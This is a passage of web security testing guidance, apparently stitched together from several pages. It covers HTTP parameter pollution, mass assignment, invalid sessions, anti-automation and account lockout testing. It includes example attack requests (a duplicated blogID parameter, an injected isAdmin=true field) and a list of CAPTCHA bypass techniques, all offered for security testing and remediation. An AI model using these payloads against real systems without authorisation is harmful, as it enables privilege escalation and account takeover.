    [...]

    security_token=attackertoken<span class="err">&amp;</span>blogID=attackerblogidvalue<span class="err">&amp;</span>blogID=victimblogidvalue<span class="err">&amp;</span>authorsList=goldshlager19test%40gmail.com(attacker email)<span class="err">&amp;</span>ok=Invite
    </code></pre>
    </div>
    </div>
    <p>The flaw resided in the authentication mechanism used by the web application, as the security check was performed on the first <code class="language-plaintext highlighter-rouge">blogID</code> parameter, whereas the actual operation used the second occurrence.</p>
    <h3 id="expected-behavior-by-application-server">Expected Behavior by Application Server</h3>
    <p>The following table illustrates how different web technologies behave in presence of multiple occurrences of the same HTTP parameter.</p>

    <h2 id="test-objectives">Test Objectives</h2>
    <ul>
    <li>Identify the backend and the parsing method used.</li>
    <li>Assess injection points and try bypassing input filters using HPP.</li>
    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <p>Luckily, because the assignment of HTTP parameters is typically handled via the web application server, and not the application code itself, testing the response to parameter pollution should be standard across all pages and actions. However, as in-depth business logic knowledge is necessary, testing HPP requires manual testing. Automatic tools can only partially assist auditors as they tend to generate too many false positives. In addition, HPP can manifest itself in client-side and server-side components.</p>
    <h3 id="server-side-hpp">Server-Side HPP</h3>
    <p>To test for HPP vulnerabilities, identify any form or action that allows user-supplied input. Query string parameters in HTTP GET requests are easy to tweak in the navigation bar of the browser. If the form action submits data via POST, the tester will need to use an intercepting proxy to tamper with the POST data as it is sent to the server. Having identified a particular input parameter to test, one can edit the GET or POST data by intercepting the request, or change the query string after the response page loads. To test for HPP vulnerabilities simply append the same parameter to the GET or POST data but with a different value assigned.</p>
    <p>For example: if testing the <code class="language-plaintext highlighter-rouge">search_string</code> parameter in the query string, the request URL would include that parameter name and value:</p>
    <div class="language-text highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code>http://example.com/?search_string=kittens
    </code></pre>
    </div>
    </div>
    <p>The particular parameter might be hidden among several other parameters, but the approach is the same; leave the other parameters in place and append the duplicate:</p>
    <div class="language-text highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code>http://example.com/?mode=guest&amp;search_string=kittens&amp;num_results=100
    </code></pre>
    </div>
    </div>
    <p>Append the same parameter with a different value:</p>
    <div class="language-text highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code>http://example.com/?mode=guest&amp;search_string=kittens&amp;num_results=100&amp;search_string=puppies
    </code></pre>
    </div>
    </div>
    <p>and submit the new request.</p>
    <p>Analyze the response page to determine which value(s) were parsed. In the above example, the search results may show <code class="language-plaintext highlighter-rouge">kittens</code>, <code class="language-plaintext highlighter-rouge">puppies</code>, some combination of both (<code class="language-plaintext highlighter-rouge">kittens,puppies</code> or <code class="language-plaintext highlighter-rouge">kittens~puppies</code> or <code class="language-plaintext highlighter-rouge">['kittens','puppies']</code>), may give an empty result, or error page.</p>
    <p>This behavior, whether using the first, last, or combination of input parameters with the same name, is very likely to be consistent across the entire application. Whether or not this default behavior reveals a potential vulnerability depends on the specific input validation and filtering specific to a particular application. As a general rule: if existing input validation and other security mechanisms are sufficient on single inputs, and if the server assigns only the first or last polluted parameters, then parameter pollution does not reveal a vulnerability. If the duplicate parameters are concatenated, different web application components use different occurrences or testing generates an error, there is an increased likelihood of being able to use parameter pollution to trigger security vulnerabilities.</p>
    <p>A more in-depth analysis would require three HTTP requests for each HTTP parameter:</p>
    <ol>
    <li>Submit an HTTP request containing the standard parameter name and value, and record the HTTP response. E.g. <code class="language-plaintext highlighter-rouge">page?par1=val1</code></li>
    <li>Replace the parameter value with a tampered value, submit and record the HTTP response. E.g. <code class="language-plaintext highlighter-rouge">page?par1=HPP_TEST1</code></li>
    <li>Send a new request combining step (1) and (2). Again, save the HTTP response. E.g. <code class="language-plaintext highlighter-rouge">page?par1=val1&amp;par1=HPP_TEST1</code></li>
    <li>Compare the responses obtained during all previous steps. If the response from (3) is different from (1) and the response from (3) is also different from (2), there is an impedance mismatch that may be eventually abused to trigger HPP vulnerabilities.</li>
    </ol>
    <p>Crafting a full exploit from a parameter pollution weakness is beyond the scope of this text. See the references for examples and details.</p>
    <h3 id="client-side-hpp">Client-Side HPP</h3>
    <p>Similarly to server-side HPP, manual testing is the only reliable technique to audit web applications in order to detect parameter pollution vulnerabilities affecting client-side components. While in the server-side variant the attacker leverages a vulnerable web application to access protected data or to perform actions that are either not permitted or not supposed to be executed, client-side attacks aim at subverting client-side components and technologies.</p>
    <p>To test for HPP client-side vulnerabilities, identify any form or action that allows user input and shows a result of that input back to the user. A search page is ideal, but a login box might not work (as it might not show an invalid username back to the user).</p>
    <p>Similarly to server-side HPP, pollute each HTTP parameter with <code class="language-plaintext highlighter-rouge">%26HPP_TEST</code> and look for <em>url-decoded</em> occurrences of the user-supplied payload:</p>
    <ul>
    <li><code class="language-plaintext highlighter-rouge">&amp;HPP_TEST</code></li>
    <li><code class="language-plaintext highlighter-rouge">&amp;amp;HPP_TEST</code></li>
    <li>etc.</li>
    </ul>
    <p>In particular, pay attention to responses having HPP vectors within <code class="language-plaintext highlighter-rouge">data</code>, <code class="language-plaintext highlighter-rouge">src</code>, <code class="language-plaintext highlighter-rouge">href</code> attributes or forms actions. Again, whether or not this default behavior reveals a potential vulnerability depends on the specific input validation, filtering and application business logic. In addition, it is important to notice that this vulnerability can also affect query string parameters used in XMLHttpRequest (XHR), runtime attribute creation and other plugin technologies (e.g. Adobe Flash&rsquo;s flashvars variables).</p>

    <h1>Auto Binding</h1>

    <h4>Auto binding refers to the automatic assignment of data or properties between an object or variable and the user interface (UI) elements of an application. It is commonly used in frameworks or libraries that support two-way data binding, where changes in the UI are automatically reflected in the data model and vice versa. Auto binding helps in simplifying the development process by reducing the need for manual synchronization between the data and UI components.</h4>

    <h2>How Auto Binding Works</h2>
    <p>In auto binding, the binding mechanism ensures that data flows seamlessly between the model and the view in a two-way fashion. Here’s a typical flow of auto binding:</p>
    <ul>
        <li><strong>Model to View:</strong> When the data in the model changes, the view (UI) automatically updates to reflect these changes. This can be seen in cases such as text fields being updated when a variable is modified.</li>
        <li><strong>View to Model:</strong> Conversely, when a user interacts with the UI elements (such as typing in a text box), the model is automatically updated with the new values, without requiring manual intervention by the developer.</li>
    </ul>

    <h2>Advantages of Auto Binding</h2>
    <p>There are several key advantages to using auto binding in web development:</p>
    <ul>
        <li><strong>Reduced Boilerplate Code:</strong> Auto binding eliminates the need for manual event handling and DOM updates, which reduces the amount of code you need to write and maintain.</li>
        <li><strong>Increased Productivity:</strong> Developers can focus on defining the logic of the application rather than handling updates to the UI.</li>
        <li><strong>Consistency:</strong> Auto binding ensures that the UI and data model are always in sync, reducing the likelihood of inconsistencies between the two.</li>
        <li><strong>Better User Experience:</strong> It provides a smooth and responsive interface where changes are immediately reflected without needing a page reload or manual refresh.</li>
    </ul>

    <h2>Technologies Supporting Auto Binding</h2>
    <p>Auto binding is widely used in various JavaScript frameworks and libraries that focus on simplifying UI development. Some popular technologies that support auto binding include:</p>
    <ul>
        <li><strong>Angular:</strong> Angular supports two-way data binding, where model changes automatically update the UI and UI updates reflect back in the model.</li>
        <li><strong>React:</strong> While React primarily uses one-way data binding, it can simulate auto binding using controlled components and state management techniques such as Redux.</li>
        <li><strong>Vue.js:</strong> Vue provides a powerful two-way data binding mechanism using the `v-model` directive, making it easy to bind data to form inputs and automatically update the UI.</li>
        <li><strong>Knockout.js:</strong> Knockout.js is a JavaScript library that facilitates automatic UI updates by linking the data model to the DOM via declarative bindings.</li>
    </ul>

    <h2>Auto Binding in Practice</h2>
    <p>To implement auto binding in your web applications, you generally define a data model and bind it to UI elements. Here’s an example of auto binding using Vue.js:</p>
    <pre>
    &lt;div id="app"&gt;
        &lt;input v-model="message" /&gt;
        &lt;p&gt;Message: {{ message }}&lt;/p&gt;
    &lt;/div&gt;

    &lt;script&gt;
    new Vue({
        el: '#app',
        data: {
            message: 'Hello, world!'
        }
    });
    &lt;/script&gt;
    </pre>
    <p>In the above example, the input field is bound to the `message` data property using the `v-model` directive. Any change made to the input field automatically updates the `message` property, and any changes to `message` automatically reflect in the UI.</p>

    <h2>Considerations for Using Auto Binding</h2>
    <p>While auto binding offers numerous benefits, there are some considerations to keep in mind:</p>
    <ul>
        <li><strong>Performance:</strong> In complex applications, excessive binding can lead to performance issues, especially when a large number of UI elements are bound to dynamic data. Optimizing data flow and minimizing unnecessary bindings is important.</li>
        <li><strong>Debugging:</strong> Auto binding can sometimes make debugging challenging because of the automatic updates between the model and the view. It may be hard to track the flow of data changes without the right debugging tools.</li>
        <li><strong>Overhead:</strong> In certain cases, the underlying framework or library may introduce additional overhead for managing bindings, which could impact application performance.</li>
    </ul>

    <h2>Conclusion</h2>
    <p>Auto binding is a powerful technique used in modern web development that allows developers to easily synchronize data between the model and the view. It simplifies the codebase, reduces errors, and improves the user experience by ensuring that data updates automatically across the application. By using frameworks like Angular, Vue.js, or React, developers can take full advantage of auto binding and focus more on application logic instead of manually managing UI updates.</p>

    <h4>Modern web applications are very often based on frameworks. Many of these web application frameworks allow automatic binding of user input (in the form of HTTP request parameters) to internal objects. This is often called autobinding. This feature can be sometimes exploited to access fields that were never intended to be modified from outside leading to privilege escalation, data tampering, bypass of security mechanisms, and more. In this case there is a Mass Assignment vulnerability.</h4>
    <p>Examples of sensitive properties:</p>
    <ul>
    <li><strong>Permission-related properties</strong>: should only be set by privileged users (e.g. <code class="language-plaintext highlighter-rouge">is_admin</code>, <code class="language-plaintext highlighter-rouge">role</code>, <code class="language-plaintext highlighter-rouge">approved</code>).</li>
    <li><strong>Process-dependent properties</strong>: should only be set internally, after a process is completed (e.g. <code class="language-plaintext highlighter-rouge">balance</code>, <code class="language-plaintext highlighter-rouge">status</code>, <code class="language-plaintext highlighter-rouge">email_verified</code>)</li>
    <li><strong>Internal properties</strong>: should only be set internally by the application (e.g. <code class="language-plaintext highlighter-rouge">created_at</code>, <code class="language-plaintext highlighter-rouge">updated_at</code>)</li>
    </ul>
    <h2 id="test-objectives">Test Objectives</h2>
    <ul>
    <li>Identify requests that modify objects</li>

    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <p>The following is a classic example that can help to illustrate the issue.</p>
    <p>Suppose a Java web application with a <code class="language-plaintext highlighter-rouge">User</code> object similar to the following:</p>
    <div class="language-java highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
       <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
       <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>
       <span class="kd">private</span> <span class="nc">String</span> <span class="n">email</span><span class="o">;</span>
       <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">isAdmin</span><span class="o">;</span>

       <span class="c1">//Getters &amp; Setters</span>
    <span class="o">}</span>
    </code></pre>
    </div>
    </div>
    <p>To create a new <code class="language-plaintext highlighter-rouge">User</code> the web application implements the following view:</p>
    <div class="language-html highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/createUser"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">text=</span><span class="s">"text"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Create"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>The controller that handles the creation request (Spring provides the automatic bind with the <code class="language-plaintext highlighter-rouge">User</code> model):</p>
    <div class="language-java highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/createUser"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="nc">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">createUser</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
       <span class="n">userService</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">user</span><span class="o">);</span>
       <span class="k">return</span> <span class="s">"successPage"</span><span class="o">;</span>
    <span class="o">}</span>
    </code></pre>
    </div>
    </div>
    <p>When the form is submitted, the following request is generated by the browser:</p>
    <div class="language-http highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="err">POST /createUser
    [...]
    username=bob&amp;password=supersecretpassword&amp;email=bob@domain.test
    </span></code></pre>
    </div>
    </div>
    <p>However, due to the autobinding, an attacker can add the <code class="language-plaintext highlighter-rouge">isAdmin</code> parameter to the request, which the controller will automatically bind to the model.</p>
    <div class="language-http highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="err">POST /createUser
    [...]
    username=bob&amp;password=supersecretpassword&amp;email=bob@domain.test&amp;isAdmin=true
    </span></code></pre>
    </div>
    </div>
    <p>The user is then created with the <code class="language-plaintext highlighter-rouge">isAdmin</code> property set to <code class="language-plaintext highlighter-rouge">true</code>, giving them administrative rights on the application.</p>
    <h3 id="black-box-testing">Black-Box Testing</h3>
    <h4 id="detect-handlers">Detect Handlers</h4>
    <p>In order to determine which part of the application is vulnerable to mass assignment, enumerate all parts of the application that accept content from the user and can potentially be mapped with a model. This includes all HTTP requests (most likely GET, POST, and PUT) that appear to allow create or update operations on the back end. One of the most simple indicators for potential mass assignments is the presence of bracket syntax for input parameter names, as for example:</p>
    <div class="language-html highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"user[name]"</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>When such patterns are encountered try to add an input related to a non-exiting attribute (e.g. <code class="language-plaintext highlighter-rouge">user[nonexistingattribute]</code>) and analyze the response/behavior. If the application does not implement any control (e.g. list of allowed fields) it is likely that it will respond with an error (e.g. 500) due to the fact that the application does not find the attribute associated to the object. More interestingly, those errors sometimes facilitate discovery of attribute names and value data types needed to exploit the issue, without access to the source code.</p>
    <h4 id="identify-sensitive-fields">Identify Sensitive Fields</h4>
    <p>Since in black-box testing the tester does not have visibility on the source code, it is necessary to find other ways in order to gather information about the attributes associated to the objects. Analyze the responses received by the back end, in particular pay attention to:</p>
    <ul>
    <li>HTML page source code</li>
    <li>Custom JavaScript code</li>
    <li>API responses</li>
    </ul>
    <p>For example, very often, it is possible to exploit handlers that return details about an object in order to gather clues on the associated fields. Suppose for example a handler that returns the profile of the user (e.g. <code class="language-plaintext highlighter-rouge">GET /profile</code>), this may include further attributes related to the user (in this example the <code class="language-plaintext highlighter-rouge">isAdmin</code> attribute looks particularly interesting).</p>
    <div class="language-json highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="p">{</span><span class="nl">"_id"</span><span class="p">:</span><span class="mi">12345</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"bob"</span><span class="p">,</span><span class="nl">"age"</span><span class="p">:</span><span class="mi">38</span><span class="p">,</span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"bob@domain.test"</span><span class="p">,</span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="kc">false</span><span class="p">}</span>
    </code></pre>
    </div>
    </div>
    <p>Then try to exploit handlers that allow the modification or creation of users, adding the <code class="language-plaintext highlighter-rouge">isAdmin</code> attribute configured to <code class="language-plaintext highlighter-rouge">true</code>.</p>
    <p>Another approach is to use wordlists in order to try to enumerate all the potential attributes. The enumeration can then be automated (e.g. via wfuzz, Burp Intruder, ZAP fuzzer, etc.). The sqlmap tool includes a <a href="https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-columns.txt">common-columns.txt</a> wordlist that can be useful to identify potential sensitive attributes. A small example of common interesting attribute names are the following:</p>
    <ul>
    <li><code class="language-plaintext highlighter-rouge">is_admin</code></li>
    <li><code class="language-plaintext highlighter-rouge">is_administrator</code></li>
    <li><code class="language-plaintext highlighter-rouge">isAdmin</code></li>
    <li><code class="language-plaintext highlighter-rouge">isAdministrator</code></li>
    <li><code class="language-plaintext highlighter-rouge">admin</code></li>
    <li><code class="language-plaintext highlighter-rouge">administrator</code></li>
    <li><code class="language-plaintext highlighter-rouge">role</code></li>
    </ul>
    <p>When multiple roles are available try to compare requests made by different user levels (pay particular attention to privileged roles). For example, if extra parameters are included in requests made by an administrative user, try those as a low privileged/anonymous user.</p>
    <h4 id="check-impact">Check Impact</h4>
    <p>The impact of a mass assignment can vary depending on the context therefore, for each test input attempted in the previous phase, analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application&rsquo;s security. For example, the modification of the <code class="language-plaintext highlighter-rouge">id</code> of an object can lead to application Denial of Service or privilege escalation. Another example is related to the possibility to modify the role/status of the user (e.g. <code class="language-plaintext highlighter-rouge">role</code> or <code class="language-plaintext highlighter-rouge">isAdmin</code>) leading to vertical privilege escalation.</p>
    <h3 id="gray-box-testing">Gray-Box Testing</h3>
    <p>When the analysis is performed with a gray-box testing approach, it is possible to follow the same methodology to verify the issue. However, the greater knowledge on the application allows to more easily identify frameworks and handlers subject to mass assignment vulnerability. In particular, when the source code is available, it is possible to search the input vectors more easily and accurately. During a source code review, use simple tools (such as the grep command) to search for one or more common patterns within the application code. Access to the DB schema or to the source code allows also to easily identify sensitive fields.</p>
    <h4 id="java">Java</h4>
    <p>Spring MVC allows to automatically bind user input into object. Identify the controllers that handle state-changing requests (e.g. find the occurrences of <code class="language-plaintext highlighter-rouge">@RequestMapping</code>) then verify if controls are in place (both on the controller or on the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:</p>
    <ul>
    <li>list of bindable fields via <code class="language-plaintext highlighter-rouge">setAllowedFields</code> method of the <code class="language-plaintext highlighter-rouge">DataBinder</code> class (e.g. <code class="language-plaintext highlighter-rouge">binder.setAllowedFields(["username","password","email"])</code>)</li>
    <li>list of non-bindable fields via <code class="language-plaintext highlighter-rouge">setDisallowedFields</code> method of the <code class="language-plaintext highlighter-rouge">DataBinder</code> class (e.g. <code class="language-plaintext highlighter-rouge">binder.setDisallowedFields(["isAdmin"])</code>)</li>
    </ul>
    <p>It is also advisable to pay attention to the use of the <code class="language-plaintext highlighter-rouge">@ModelAttribute</code> annotation that allows to specify a different name/key.</p>
    <h4 id="php">PHP</h4>
    <p>Laravel Eloquent ORM provides a <code class="language-plaintext highlighter-rouge">create</code> method which allows automatic assignment of attributes. However, the latest versions of Eloquent ORM provide default protection against mass assignment vulnerabilities requiring to explicitly specify allowed attributes that can be assigned automatically, through the <code class="language-plaintext highlighter-rouge">$fillable</code> array, or attributes that have to be protected (non-bindable), trough the <code class="language-plaintext highlighter-rouge">$guarded</code> array. Therefore by analyzing the models (classes that extend the <code class="language-plaintext highlighter-rouge">Model</code> class) it is possible to identify which attributes are allowed or denied and therefore point out potential vulnerabilities.</p>
    <h4 id="net">.NET</h4>
    <p>Model binding in ASP.NET automatically bind user inputs to object properties. This also works with complex types and it will automatically convert the input data to the properties if the properties&rsquo; names match with the input. Identify the controllers then verify if controls are in place (both inside the controller or in the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:</p>
    <ul>
    <li>fields declared as <code class="language-plaintext highlighter-rouge">ReadOnly</code></li>
    <li>list of bindable fields via <code class="language-plaintext highlighter-rouge">Bind</code> attribute (e.g. <code class="language-plaintext highlighter-rouge">[Bind(Include = "FirstName, LastName")] Student std</code>), via <code class="language-plaintext highlighter-rouge">includeProperties</code> (e.g. <code class="language-plaintext highlighter-rouge">includeProperties: new[] { "FirstName, LastName" }</code>) or through <code class="language-plaintext highlighter-rouge">TryUpdateModel</code></li>
    <li>list of non-bindable fields via <code class="language-plaintext highlighter-rouge">Bind</code> attribute (e.g. <code class="language-plaintext highlighter-rouge">[Bind(Exclude = "Status")] Student std</code>) or via <code class="language-plaintext highlighter-rouge">excludeProperties</code> (e.g. <code class="language-plaintext highlighter-rouge">excludeProperties: new[] { "Status" }</code>)</li>
    </ul>

	      <sl-details summary="invalid session" open>
	      <h4>An invalid session occurs when the session ID or session data stored by a server is no longer valid, either because it has expired, been tampered with, or been terminated by the server. Invalid sessions are a common issue in web applications that manage user authentication and state, and they can lead to security vulnerabilities if not handled properly.</h4>

    <h2>Causes of Invalid Sessions</h2>
    <p>There are several potential causes for an invalid session:</p>
    <ul>
        <li><strong>Session Expiration:</strong> A session may expire after a certain period of inactivity, requiring the user to log in again to obtain a new session.</li>
        <li><strong>Session Termination:</strong> The server may invalidate a session due to logout, password change, or other security measures.</li>
        <li><strong>Session Hijacking:</strong> Attackers may steal a session ID and use it to impersonate the legitimate user, causing the session to become invalid if detected by the server.</li>
        <li><strong>Session Data Corruption:</strong> Any alteration or corruption in session data, whether intentional or accidental, can render a session invalid.</li>
        <li><strong>Session Fixation:</strong> If an attacker can fix a user's session ID before login, it can lead to an invalid session after the user logs in, as the server may reject the fixed ID.</li>
    </ul>

    <h2>Impact of Invalid Sessions</h2>
    <p>When an invalid session is detected, it can have a variety of consequences, including:</p>
    <ul>
        <li><strong>Access Denied:</strong> The user may be logged out automatically or forced to reauthenticate, which can lead to disruptions in user experience.</li>
        <li><strong>Security Risks:</strong> Improper session handling can expose users to session fixation, hijacking, or other attacks that compromise account security.</li>
        <li><strong>Loss of Data:</strong> If a session becomes invalid unexpectedly, any unsaved data in that session could be lost, affecting user experience.</li>
    </ul>

    <h2>Identifying Invalid Session Issues</h2>
    <p>Detecting invalid sessions often involves monitoring session management practices and reviewing server logs for any anomalies. Signs of invalid session issues may include:</p>
    <ul>
        <li><strong>Unexpected Logouts:</strong> Users may be logged out automatically without action or reason.</li>
        <li><strong>Access Denied Errors:</strong> Users may encounter 403 Forbidden or 401 Unauthorized errors when trying to access resources they are authorized to use.</li>
        <li><strong>Session Expiration Messages:</strong> Applications may display warning messages indicating that the session has expired or is no longer valid.</li>
        <li><strong>Frequent Login Prompts:</strong> Users may be prompted to log in again repeatedly, even if they have already authenticated within the same session.</li>
    </ul>

    <h2>Preventing Invalid Session Issues</h2>
    <p>To prevent invalid session issues and improve security, developers can implement several best practices:</p>
    <ul>
        <li><strong>Use Secure Cookies:</strong> Ensure that session cookies are marked as secure, HTTPOnly, and SameSite to prevent unauthorized access.</li>
        <li><strong>Session Timeout:</strong> Set appropriate session timeouts that balance security and user convenience. Users should be logged out automatically after a certain period of inactivity.</li>
        <li><strong>Implement Strong Authentication:</strong> Use multi-factor authentication (MFA) to enhance the security of session creation and reduce the chances of session hijacking.</li>
        <li><strong>Session Management Mechanisms:</strong> Use mechanisms like rotating session IDs or regenerating session IDs after sensitive actions (e.g., login, password change) to prevent session fixation.</li>
        <li><strong>Monitor and Detect Suspicious Activity:</strong> Continuously monitor user sessions for unusual patterns or behavior, such as access from different geographical locations or devices.</li>
        <li><strong>Ensure Proper Session Termination:</strong> Ensure that when a user logs out, the session is completely terminated on both the client and server sides.</li>
    </ul>

      <h1>Testing Anti-Automation Measures</h1>

          <p>Anti-automation measures are designed to prevent automated tools, such as web vulnerability scanners or web scrapers, from interacting with the web application. Here are some methods you can use to test for anti-automation measures:</p>

          <ol>
              <li>
                  <h2>Manual testing:</h2>
                  <p>Manually test the web application by attempting to interact with it using automated tools. If the web application blocks or restricts the automated tool's ability to interact with it, this indicates the presence of anti-automation measures.</p>
              </li>

              <li>
                  <h2>Use different user agents:</h2>

        </br>
        <h4>Account lockout mechanisms are used to mitigate brute force attacks. Some of the attacks that can be defeated by using lockout mechanism:</h4>
        <ul>
        <li>Login password or username guessing attack.</li>
        <li>Code guessing on any 2FA functionality or Security Questions.</li>
        </ul>
        <p>Account lockout mechanisms require a balance between protecting accounts from unauthorized access and protecting users from being denied authorized access. Accounts are typically locked after 3 to 5 unsuccessful attempts and can only be unlocked after a predetermined period of time, via a self-service unlock mechanism, or intervention by an administrator.</p>
        <p>Despite it being easy to conduct brute force attacks, the result of a successful attack is dangerous as the attacker will have full access on the user account and with it all the functionality and services they have access to.</p>
        <h2 id="test-objectives">Test Objectives</h2>
        <ul>
        <li>Evaluate the account lockout mechanism&rsquo;s ability to mitigate brute force password guessing.</li>
        <li>Evaluate the unlock mechanism&rsquo;s resistance to unauthorized account unlocking.</li>
        </ul>
        <h2 id="how-to-test">How to Test</h2>
        <h3 id="lockout-mechanism">Lockout Mechanism</h3>
        <p>To test the strength of lockout mechanisms, you will need access to an account that you are willing or can afford to lock. If you have only one account with which you can log on to the web application, perform this test at the end of your test plan to avoid losing testing time by being locked out.</p>
        <p>To evaluate the account lockout mechanism&rsquo;s ability to mitigate brute force password guessing, attempt an invalid log in by using the incorrect password a number of times, before using the correct password to verify that the account was locked out. An example test may be as follows:</p>
        <ol>
        <li>Attempt to log in with an incorrect password 3 times.</li>
        <li>Successfully log in with the correct password, thereby showing that the lockout mechanism doesn&rsquo;t trigger after 3 incorrect authentication attempts.</li>
        <li>Attempt to log in with an incorrect password 4 times.</li>
        <li>Successfully log in with the correct password, thereby showing that the lockout mechanism doesn&rsquo;t trigger after 4 incorrect authentication attempts.</li>
        <li>Attempt to log in with an incorrect password 5 times.</li>
        <li>Attempt to log in with the correct password. The application returns &ldquo;Your account is locked out.&rdquo;, thereby confirming that the account is locked out after 5 incorrect authentication attempts.</li>
        <li>Attempt to log in with the correct password 5 minutes later. The application returns &ldquo;Your account is locked out.&rdquo;, thereby showing that the lockout mechanism does not automatically unlock after 5 minutes.</li>
        <li>Attempt to log in with the correct password 10 minutes later. The application returns &ldquo;Your account is locked out.&rdquo;, thereby showing that the lockout mechanism does not automatically unlock after 10 minutes.</li>
        <li>Successfully log in with the correct password 15 minutes later, thereby showing that the lockout mechanism automatically unlocks after a 10 to 15 minute period.</li>
        </ol>
        <p>A CAPTCHA may hinder brute force attacks, but they can come with their own set of weaknesses, and should not replace a lockout mechanism. A CAPTCHA mechanism may be bypassed if implemented incorrectly. CAPTCHA flaws include:</p>
        <ol>
        <li>Easily defeated challenge, such as arithmetic or limited question set.</li>
        <li>CAPTCHA checks for HTTP response code instead of response success.</li>
        <li>CAPTCHA server-side logic defaults to a successful solve.</li>
        <li>CAPTCHA challenge result is never validated server-side.</li>
        <li>CAPTCHA input field or parameter is manually processed, and is improperly validated or escaped.</li>
        </ol>
        <p>To evaluate CAPTCHA effectiveness:</p>
        <ol>
        <li>Assess CAPTCHA challenges and attempt automating solutions depending on difficulty.</li>
        <li>Attempt to submit request without solving CAPTCHA via the normal UI mechanism(s).</li>
        <li>Attempt to submit request with intentional CAPTCHA challenge failure.</li>
        <li>Attempt to submit request without solving CAPTCHA (assuming some default values may be passed by client-side code, etc) while using a testing proxy (request submitted directly server-side).</li>
        <li>Attempt to fuzz CAPTCHA data entry points (if present) with common injection payloads or special characters sequences.</li>
        <li>Check if the solution to the CAPTCHA might be the alt-text of the image(s), filename(s), or a value in an associated hidden field.</li>
        <li>Attempt to re-submit previously identified known good responses.</li>
        <li>Check if clearing cookies causes the CAPTCHA to be bypassed (for example if the CAPTCHA is only shown after a number of failures).</li>
        <li>If the CAPTCHA is part of a multi-step process, attempt to simply access or complete a step beyond the CAPTCHA (for example if CAPTCHA is the first step in a login process, try simply submitting the second step [username and password]).</li>
        <li>Check for alternative methods that might not have CAPTCHA enforced, such as an API endpoint meant to facilitate mobile app access.</li>
        </ol>
        <p>Repeat this process to every possible functionality that could require a lockout mechanism.</p>
        <h3 id="unlock-mechanism">Unlock Mechanism</h3>
        <p>To evaluate the unlock mechanism&rsquo;s resistance to unauthorized account unlocking, initiate the unlock mechanism and look for weaknesses. Typical unlock mechanisms may involve secret questions or an emailed unlock link. The unlock link should be a unique one-time link, to stop an attacker from guessing or replaying the link and performing brute force attacks in batches.</p>
        <p>Note that an unlock mechanism should only be used for unlocking accounts. It is not the same as a password recovery mechanism, yet could follow the same security practices.</p>
        <h2 id="remediation">Remediation</h2>
        <p>Apply account unlock mechanisms depending on the risk level. In order from lowest to highest assurance:</p>
        <ol>
        <li>Time-based lockout and unlock.</li>
        <li>Self-service unlock (sends unlock email to registered email address).</li>
        <li>Manual administrator unlock.</li>
        <li>Manual administrator unlock with positive user identification.</li>
        </ol>
        <p>Factors to consider when implementing an account lockout mechanism:</p>
        <ol>
        <li>What is the risk of brute force password guessing against the application?</li>
        <li>Is a CAPTCHA sufficient to mitigate this risk?</li>
        <li>Is a client-side lockout mechanism being used (e.g., JavaScript)? (If so, disable the client-side code to test.)</li>
        <li>Number of unsuccessful log in attempts before lockout. If the lockout threshold is too low then valid users may be locked out too often. If the lockout threshold is too high then the more attempts an attacker can make to brute force the account before it will be locked. Depending on the application&rsquo;s purpose, a range of 5 to 10 unsuccessful attempts is a typical lockout threshold.</li>
        <li>How will accounts be unlocked?
        <ol>
        <li>Manually by an administrator: this is the most secure lockout method, but may cause inconvenience to users and take up the administrator&rsquo;s &ldquo;valuable&rdquo; time.
        <ol>
        <li>Note that the administrator should also have a recovery method in case his account gets locked.</li>
        <li>This unlock mechanism may lead to a denial-of-service attack if an attacker&rsquo;s goal is to lock the accounts of all users of the web application.</li>
        </ol>
        </li>
        <li>After a period of time: What is the lockout duration? Is this sufficient for the application being protected? E.g. a 5 to 30 minute lockout duration may be a good compromise between mitigating brute force attacks and inconveniencing valid users.</li>
